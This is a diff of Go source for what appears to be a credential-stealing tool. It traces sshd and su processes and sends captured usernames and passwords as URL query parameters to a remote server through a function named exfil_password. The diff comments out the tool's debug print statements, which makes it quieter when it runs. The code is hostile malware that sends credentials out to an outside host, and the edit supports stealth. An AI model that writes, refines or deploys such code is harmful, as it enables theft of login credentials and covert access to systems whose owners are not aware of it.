@@ -58,7 +58,7 @@ func exfil_password(username, password string) {
 	values.Set("username", username)
 	values.Set("password", password)
 	fullURL := fmt.Sprintf("%s?%s", serverURL, values.Encode())
-	fmt.Printf("Sending to %s\n", fullURL)
+	//fmt.Printf("Sending to %s\n", fullURL)
 	http.Get(fullURL)
 }
 
@@ -75,7 +75,7 @@ func main() {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
-					fmt.Println("SSHD process found with PID:", pid)
+					//fmt.Println("SSHD process found with PID:", pid)
 					go traceSSHDProcess(pid)
 					processed_pids = append(processed_pids, pid)
 				}
@@ -84,7 +84,7 @@ func main() {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
-					fmt.Println("SU process found with PID:", pid)
+					//fmt.Println("SU process found with PID:", pid)
 					go traceSUProcess(pid)
 					processed_pids = append(processed_pids, pid)
 				}
